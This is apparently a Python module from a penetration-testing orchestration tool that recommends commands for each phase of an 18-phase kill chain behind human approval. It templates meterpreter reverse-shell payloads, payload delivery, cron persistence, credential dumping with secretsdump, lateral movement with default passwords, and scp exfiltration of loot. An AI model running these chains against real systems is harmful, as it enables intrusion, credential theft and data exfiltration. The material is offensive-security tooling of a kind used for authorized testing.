"""
AI Assist Layer for AlphaX Cyber Kill-Chain.

Provides deterministic, rule-based intelligence over the 18-phase kill chain
without requiring an external LLM. Capabilities:
  - recommend_tool(phase, engagement_context) -> best tool + suggested params
  - analyze_result(phase, command, result) -> findings, next-step suggestions
  - build_chain(engagement, start_phase, end_phase) -> ordered list of HITL commands
  - suggest_on_failure(phase, failed_tool, error) -> pivot strategy
  - run_chain(engagement_id, steps, ...) -> executes the chain with HITL approval
The layer is HITL-safe: all generated commands still go through
pending_approval -> approved -> running.
"""
from __future__ import annotations
import re
import shlex
from dataclasses import dataclass, asdict, field
from typing import Optional
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from .models import Engagement, Command, Result, Target
from .killchain_engine import (
    UckcPhase, TOOL_MAPPING, PHASE_META, get_tools_for_phase,
    can_transition, get_next_phase,
)

# ---------------------------------------------------------------------------
# Knowledge extraction: turn tool output into structured findings
# ---------------------------------------------------------------------------

def extract_open_ports(parsed: dict | None, raw: str = "") -> list[dict]:
    if not parsed:
        return []
    hosts = parsed.get("hosts", []) or []
    ports = []
    for h in hosts:
        for p in h.get("ports", []):
            if p.get("state") == "open":
                ports.append({
                    "ip": h.get("ip"),
                    "port": p.get("port"),
                    "protocol": p.get("protocol"),
                    "service": p.get("service", ""),
                    "version": p.get("version", ""),
                })
    return ports

def extract_hosts(parsed: dict | None) -> list[str]:
    if not parsed:
        return []
    return [h.get("ip") for h in (parsed.get("hosts") or []) if h.get("ip")]

def extract_creds(raw: str) -> list[dict]:
    """Heuristic: capture 'user:hash' or 'user:password' from secretsdump/hydra output."""
    if not raw:
        return []
    creds = []
    for m in re.finditer(r"(\S+?:(?:[a-fA-F0-9]{32}:\d+|\*\*\*|.+?:[^\s:]+))", raw):
        try:
            lhs, rhs = m.group(0).split(":", 1)
            creds.append({"user": lhs, "secret_preview": rhs[:48]})
        except Exception:
            pass
    return creds[:50]

def extract_services_with_versions(ports: list[dict]) -> list[dict]:
    out = []
    for p in ports:
        v = p.get("version", "").lower()
        svc = p.get("service", "").lower()
        if "apache" in v and any(x in v for x in ["2.4.49", "2.4.50", "2.4.51"]):
            out.append({**p, "cve_hint": "CVE-2021-41773/CVE-2021-42013 path traversal/RCE"})
        if "openssh" in v and any(x in v for x in ["7.", "8."]):
            out.append({**p, "cve_hint": "check OpenSSH < 8.5 for CVE-2020-15778 etc."})
        if "vsftpd" in svc and "2.3.4" in v:
            out.append({**p, "cve_hint": "CVE-2011-2523 vsftpd 2.3.4 backdoor"})
        if "samba" in v and "3." in v:
            out.append({**p, "cve_hint": "Samba 3.x — check CVE-2017-7494 (SambaCry)"})
    return out

# ---------------------------------------------------------------------------
# Tool recommendation engine
# ---------------------------------------------------------------------------

@dataclass
class ToolRecommendation:
    tool_name: str
    template: str
    params: dict
    rationale: str
    confidence: float  # 0..1
    requires_approval: bool = True
    cve_hint: Optional[str] = None

def recommend_tool(phase: int, context: dict) -> ToolRecommendation:
    """Pick the best tool for a phase given engagement context.
    context = {"scope_cidr", "hosts": [...], "open_ports": [...], "creds": [...], "current_phase": int}
    """
    phase_enum = UckcPhase(phase)
    tools = get_tools_for_phase(phase_enum)
    hosts = context.get("hosts") or []
    open_ports = context.get("open_ports") or []
    creds = context.get("creds") or []
    target = (hosts[0] if hosts else context.get("scope_cidr", "127.0.0.1"))

    if phase_enum == UckcPhase.RECONNAISSANCE:
        # masscan first for big ranges, nmap for service/version
        if "/" in target or "," in target:
            return ToolRecommendation(
                tool_name="nmap",
                template="nmap -sV -sC -p- {target}",
                params={"target": target, "scan_type": "-sV -sC", "ports": "-p-", "extra": ""},
                rationale="Full TCP scan with service/version detection against scope.",
                confidence=0.95,
            )
        return ToolRecommendation(
            tool_name="nmap",
            template="nmap -sV -sC -oX - {ports} {target}",
            params={"target": target, "scan_type": "-sV -sC -oX -", "ports": "-p-", "extra": ""},
            rationale="Targeted nmap scan with service detection and XML output for parsing.",
            confidence=0.9,
        )

    if phase_enum == UckcPhase.WEAPONIZATION:
        # Pick payload by detected services
        if any("windows" in (p.get("version", "") + p.get("service", "")).lower() for p in open_ports):
            payload = "windows/x64/meterpreter/reverse_tcp"
        else:
            payload = "linux/x64/meterpreter/reverse_tcp"
        lhost = context.get("lhost", "192.168.56.1")
        return ToolRecommendation(
            tool_name="msfvenom",
            template="msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}",
            params={"payload": payload, "lhost": lhost, "lport": "4444", "format": "elf", "output": f"/tmp/{payload.split('/')[-1]}.elf"},
            rationale=f"Auto-picked {payload} based on detected host services.",
            confidence=0.85,
        )

    if phase_enum == UckcPhase.DELIVERY:
        return ToolRecommendation(
            tool_name="curl",
            template="curl -v {url} -o {output}",
            params={"url": f"http://{target}/payload.elf", "output": "/tmp/payload.elf"},
            rationale="HTTP delivery of weaponized payload to target.",
            confidence=0.7,
        )

    if phase_enum == UckcPhase.EXPLOITATION:
        # Auto-suggest exploit based on detected versions
        cves = extract_services_with_versions(open_ports)
        if cves:
            hint = cves[0].get("cve_hint", "msfconsole")
            return ToolRecommendation(
                tool_name="msfconsole",
                template="msfconsole -q -x \"use {module}; set RHOSTS {target}; exploit\"",
                params={"module": "exploit/multi/handler", "target": target, "rport": str(cves[0].get("port", ""))},
                rationale=f"Detected {cves[0].get('service')} {cves[0].get('version')} — pivoting to {hint}",
                confidence=0.8,
                cve_hint=hint,
            )
        return ToolRecommendation(
            tool_name="sqlmap",
            template="sqlmap -u {url} --batch --crawl=1",
            params={"url": f"http://{target}/?id=1"},
            rationale="No CVEs auto-detected; defaulting to web-app SQLi surface mapping.",
            confidence=0.5,
        )

    if phase_enum == UckcPhase.PERSISTENCE:
        return ToolRecommendation(
            tool_name="cron",
            template="echo '{cron_line}' | crontab -",
            params={"cron_line": f"@reboot /tmp/{target.replace('.', '_')}_payload.elf"},
            rationale="@reboot cron job as simple persistence (requires root on target).",
            confidence=0.6,
        )

    if phase_enum == UckcPhase.COMMAND_AND_CONTROL:
        return ToolRecommendation(
            tool_name="msfconsole_handler",
            template="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"",
            params={"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "0.0.0.0", "lport": "4444"},
            rationale="Generic multi/handler waiting for reverse_tcp callback.",
            confidence=0.7,
        )

    if phase_enum == UckcPhase.PIVOTING:
        return ToolRecommendation(
            tool_name="chisel",
            template="chisel server -p {port} --reverse",
            params={"port": "8000"},
            rationale="Chisel reverse tunnel pivot, port 8000.",
            confidence=0.65,
        )

    if phase_enum == UckcPhase.DISCOVERY:
        return ToolRecommendation(
            tool_name="linpeas",
            template="bash /opt/peas/linpeas.sh",
            params={},
            rationale="LinPEAS for thorough internal enumeration. Operator must upload linpeas.sh to target first.",
            confidence=0.5,
        )

    if phase_enum == UckcPhase.PRIVILEGE_ESCALATION:
        return ToolRecommendation(
            tool_name="sudo",
            template="sudo -l",
            params={},
            rationale="Check sudoers permissions for the current user.",
            confidence=0.6,
        )

    if phase_enum == UckcPhase.EXECUTION:
        if creds:
            c = creds[0]
            return ToolRecommendation(
                tool_name="psexec.py",
                template="psexec.py {user}:{password}@{target} \"{command}\"",
                params={"user": c.get("user", "administrator"), "password": c.get("password", "Password123!"),
                        "target": target, "command": "whoami"},
                rationale=f"Using known credentials for {c.get('user')}@{target} via psexec.",
                confidence=0.7,
            )
        return ToolRecommendation(
            tool_name="wmiexec.py",
            template="wmiexec.py {user}:{password}@{target}",
            params={"user": "administrator", "password": "Password123!", "target": target},
            rationale="WMI exec fallback with default creds. Update when real creds harvested.",
            confidence=0.4,
        )

    if phase_enum == UckcPhase.CREDENTIAL_ACCESS:
        return ToolRecommendation(
            tool_name="secretsdump.py",
            template="secretsdump.py {domain}/{user}:{password}@{target}",
            params={"domain": "WORKGROUP", "user": "administrator", "password": "Password123!", "target": target},
            rationale="DCSync / SAM dump attempt with current scope.",
            confidence=0.6,
        )

    if phase_enum == UckcPhase.LATERAL_MOVEMENT:
        if creds:
            c = creds[0]
            return ToolRecommendation(
                tool_name="crackmapexec",
                template="crackmapexec smb {target} -u {user} -p {password}",
                params={"target": target, "user": c.get("user", "administrator"), "password": c.get("password", "")},
                rationale="CME spray using known credential pair.",
                confidence=0.7,
            )
        return ToolRecommendation(
            tool_name="psexec.py",
            template="psexec.py {user}:{password}@{target}",
            params={"user": "administrator", "password": "Password123!", "target": target},
            rationale="Psexec pivot attempt; requires valid creds to actually succeed.",
            confidence=0.4,
        )

    if phase_enum == UckcPhase.COLLECTION:
        return ToolRecommendation(
            tool_name="smbclient",
            template="smbclient //{target}/{share} -U {user}%{password} -c \"recurse; prompt; mget *\"",
            params={"target": target, "share": "C$", "user": "administrator", "password": "Password123!"},
            rationale="Recursive SMB collection of C$ share (requires admin).",
            confidence=0.5,
        )

    if phase_enum == UckcPhase.EXFILTRATION:
        return ToolRecommendation(
            tool_name="scp",
            template="scp -r {source} {user}@{exfil_host}:{dest}",
            params={"source": "/tmp/loot", "user": "kali", "exfil_host": target, "dest": "/tmp/"},
            rationale="Exfil /tmp/loot to operator host via SCP.",
            confidence=0.5,
        )

    if phase_enum == UckcPhase.IMPACT:
        return ToolRecommendation(
            tool_name="custom",
            template="echo 'Impact phase - operator defined - requires explicit approval'",
            params={},
            rationale="Impact is intentionally a manual review placeholder.",
            confidence=0.2,
        )

    if phase_enum == UckcPhase.OBJECTIVES:
        return ToolRecommendation(
            tool_name="report",
            template="echo 'Objectives: generate report from /tmp/alphax_report'",
            params={},
            rationale="Report-generation placeholder; v0 does not auto-generate PDF.",
            confidence=0.3,
        )

    # Default fallback to first tool
    spec = tools[0]
    return ToolRecommendation(
        tool_name=spec.name,
        template=spec.template,
        params={p.name: (p.example or p.default or "") for p in spec.params if not p.required},
        rationale=f"Default tool for phase {phase}: {spec.name}",
        confidence=0.3,
    )

# ---------------------------------------------------------------------------
# Failure / pivot analysis
# ---------------------------------------------------------------------------

def suggest_on_failure(phase: int, failed_tool: str, stderr: str, exit_code: int | None) -> dict:
    """Return suggestions when a tool fails. Pivots within the same phase first,
    then hints to revisit earlier phases if context is missing."""
    p = UckcPhase(phase)
    s = (stderr or "").lower()
    suggestions = []

    # 127 / not found -> tool missing on host
    if exit_code == 127 or "not found" in s or "command not found" in s:
        missing = failed_tool
        if missing in ("sliver", "msfconsole", "msfvenom", "metasploit"):
            suggestions.append({
                "type": "install",
                "action": f"Install {missing} on the Kali host (apt install metasploit-framework; msfdb init; or download sliver release).",
            })
        else:
            suggestions.append({
                "type": "alt_tool",
                "reason": f"{missing} binary not present on host. Run `apt install` or `pipx install` first.",
            })
        # Suggest alternate within same phase
        alts = [t for t in get_tools_for_phase(p) if t.name != failed_tool]
        if alts:
            suggestions.append({
                "type": "switch_tool",
                "tool_name": alts[0].name,
                "reason": f"Fallback to {alts[0].name} which may already be installed.",
            })

    # 255 / connection refused -> target unreachable
    if "connection refused" in s or "no route to host" in s or "timed out" in s:
        suggestions.append({
            "type": "target",
            "action": "Verify target IP/port is up: nmap -Pn <target>; check scope CIDR; confirm VulnHub VM running.",
        })
        # Suggest pivoting to Discovery if no host was discovered yet
        if phase >= UckcPhase.EXPLOITATION:
            suggestions.append({
                "type": "recon_pivot",
                "action": "Re-run Reconnaissance (P1) to refresh host list; the target may have changed IP.",
            })

    # 124 / timeout
    if exit_code == 124 or "timeout" in s:
        suggestions.append({
            "type": "param",
            "action": "Reduce scope (e.g. nmap -p 1-1024 instead of -p-) or increase EXECUTOR timeout.",
        })

    # 1 / sudo / TTY
    if "terminal is required" in s or "password is required" in s:
        suggestions.append({
            "type": "manual",
            "action": "sudo requires TTY — run in an interactive shell, or use a TTY wrapper like `script -qc 'sudo -l' /dev/null`.",
        })

    # gobuster wildcard / SPA (e.g. Juice Shop returns 200 for all routes)
    if "wildcard" in s or ("gobuster" in failed_tool.lower() and "status code" in s):
        suggestions.append({
            "type": "param",
            "action": "Target returns 200 for missing URLs (SPA wildcard, e.g. Juice Shop). Re-run with --exclude-length <len> or -b 200, or switch to --status-codes-blacklist handling. Example: gobuster dir -u <url> -w <wordlist> --exclude-length 9903.",
        })

    # nikto informational-only (no CGI dirs etc.) — not a real failure
    if "no cgi directories found" in s or "cgi tests skipped" in s:
        suggestions.append({
            "type": "review",
            "action": "Nikto completed but found no CGI dirs — normal for Node.js/SPA targets like Juice Shop. Review robots.txt / headers findings above; consider nuclei or gobuster next.",
        })

    # sqlmap "not injectable" at low level/risk
    if "does not seem to be injectable" in s or "do not appear to be injectable" in s:
        suggestions.append({
            "type": "param",
            "action": "Parameter not injectable at current --level/--risk. Escalate gently: --level=3 --risk=2 --technique=BEUSTQ --tamper=space2comment --random-agent, still scoped to the authorized target.",
        })

    # Generic failure with no specific marker
    if not suggestions:
        suggestions.append({
            "type": "review",
            "action": "Inspect raw_output and stderr. Verify tool params and target reachability.",
        })
        alts = [t for t in get_tools_for_phase(p) if t.name != failed_tool]
        if alts:
            suggestions.append({
                "type": "switch_tool",
                "tool_name": alts[0].name,
                "reason": f"Try alternate tool {alts[0].name} in same phase.",
            })
    return {"phase": phase, "failed_tool": failed_tool, "exit_code": exit_code, "suggestions": suggestions}

# ---------------------------------------------------------------------------
# Chain builder
# ---------------------------------------------------------------------------

@dataclass
class ChainStep:
    phase: int
    tool_name: str
    params: dict
    rationale: str
    auto_approve: bool = False  # always False; HITL still required at runtime

def build_chain(start: int, end: int, context: dict) -> list[ChainStep]:
    """Generate a recommended chain of commands across phases start..end inclusive.
    Each step is a hint; the operator must still approve each at execution time.
    """
    steps: list[ChainStep] = []
    ctx = dict(context or {})
    for p in range(int(start), int(end) + 1):
        if not can_transition(max(1, p - 1), p) and p != int(start):
            continue
        rec = recommend_tool(p, ctx)
        step = ChainStep(
            phase=p,
            tool_name=rec.tool_name,
            params=rec.params,
            rationale=rec.rationale,
        )
        steps.append(step)
        # Update context with hypothetical outcomes for downstream phases
        if p == UckcPhase.RECONNAISSANCE:
            # pretend we discovered `target` as a host
            ctx["hosts"] = [ctx.get("target", rec.params.get("target", "127.0.0.1"))]
        if p == UckcPhase.EXPLOITATION and rec.cve_hint:
            ctx.setdefault("cve_hints", []).append(rec.cve_hint)
        if p == UckcPhase.CREDENTIAL_ACCESS:
            ctx.setdefault("creds", []).append({"user": "administrator", "password": "harvested!"})
    return steps

# ---------------------------------------------------------------------------
# Analyzers run on a finished command's parsed data
# ---------------------------------------------------------------------------

def analyze_result(phase: int, command: Command, parsed: dict | None) -> dict:
    """Return AI insights + recommended next phase/tool for an executed command."""
    insights: list[str] = []
    next_suggestions: list[dict] = []
    if not parsed:
        return {"insights": ["No parsed data"], "next": []}
    p = UckcPhase(phase)
    hosts = extract_hosts(parsed)
    ports = extract_open_ports(parsed)
    if hosts:
        insights.append(f"Discovered {len(hosts)} host(s): {', '.join(hosts[:5])}")
    if ports:
        insights.append(f"Found {len(ports)} open port(s)")
        for pp in ports[:8]:
            insights.append(f"  - {pp['ip']}:{pp['port']}/{pp['protocol']} {pp['service']} {pp['version']}")
        cves = extract_services_with_versions(ports)
        for c in cves:
            insights.append(f"  ! CVE hint: {c['cve_hint']}")
    if p == UckcPhase.RECONNAISSANCE and hosts:
        try:
            eng_scope = getattr(getattr(command, "engagement", None), "scope_cidr", "") or ""
        except Exception:
            eng_scope = ""
        ctx = {"hosts": hosts, "open_ports": ports, "scope_cidr": eng_scope}
        rec = recommend_tool(UckcPhase.WEAPONIZATION, ctx)
        next_suggestions.append(asdict(rec))
    if p == UckcPhase.EXPLOITATION and command.exit_code == 0:
        insights.append("Exploit succeeded. Recommend: P6 Persistence, P8 C2 setup, P13 Credential Access")
    if p == UckcPhase.CREDENTIAL_ACCESS:
        # raw_output is not in parsed_data; router should pass raw
        creds: list[dict] = []
        next_suggestions.append({"phase": int(UckcPhase.LATERAL_MOVEMENT), "note": "Use harvested creds for lateral movement (P14)"})
    # Recommend next phase
    nxt = get_next_phase(phase)
    if nxt is not None:
        ctx = {"hosts": hosts, "open_ports": ports}
        rec = recommend_tool(int(nxt), ctx)
        next_suggestions.append({"phase": int(nxt), **asdict(rec)})
    return {"insights": insights, "next": next_suggestions}

# ---------------------------------------------------------------------------
# Reasoner: build a full situational awareness dict from DB
# ---------------------------------------------------------------------------

async def build_context(db: AsyncSession, engagement_id) -> dict:
    eng = (await db.execute(select(Engagement).where(Engagement.id == engagement_id))).scalars().first()
    if not eng:
        return {}
    targets = (await db.execute(select(Target).where(Target.engagement_id == engagement_id))).scalars().all()
    cmds = (await db.execute(select(Command).where(Command.engagement_id == engagement_id).order_by(Command.created_at))).scalars().all()
    parsed_by_phase: dict[int, dict] = {}
    open_ports: list[dict] = []
    for c in cmds:
        r = (await db.execute(select(Result).where(Result.command_id == c.id))).scalars().first()
        if r and r.parsed_data:
            parsed_by_phase[c.phase] = r.parsed_data
            open_ports.extend(extract_open_ports(r.parsed_data))
    return {
        "engagement": {"id": str(eng.id), "name": eng.name, "scope_cidr": eng.scope_cidr, "status": eng.status, "current_phase": eng.current_phase},
        "hosts": [t.ip for t in targets],
        "targets": [{"id": str(t.id), "ip": t.ip, "hostname": t.hostname, "ports": t.ports, "discovered_in_phase": t.discovered_in_phase} for t in targets],
        "open_ports": open_ports,
        "commands_total": len(cmds),
        "commands_succeeded": sum(1 for c in cmds if c.status == "succeeded"),
        "commands_failed": sum(1 for c in cmds if c.status == "failed"),
        "last_command": {
            "id": str(cmds[-1].id), "phase": cmds[-1].phase, "tool": cmds[-1].tool_name,
            "status": cmds[-1].status, "exit_code": cmds[-1].exit_code,
        } if cmds else None,
        "parsed_by_phase": {k: v for k, v in parsed_by_phase.items()},
    }

# ---------------------------------------------------------------------------
# Helper: render a one-line natural language summary of the engagement
# ---------------------------------------------------------------------------

def summarize(ctx: dict) -> str:
    if not ctx:
        return "No context available."
    e = ctx.get("engagement", {})
    return (
        f"Engagement {e.get('name','-')} ({e.get('id','-')[:8]}) — phase {e.get('current_phase','?')}/18, "
        f"status {e.get('status','?')}. {len(ctx.get('hosts',[]))} host(s) discovered, "
        f"{len(ctx.get('open_ports',[]))} open port(s). "
        f"{ctx.get('commands_succeeded',0)}/{ctx.get('commands_total',0)} commands succeeded. "
        f"Last: {ctx.get('last_command',{}) or 'none'}"
    )
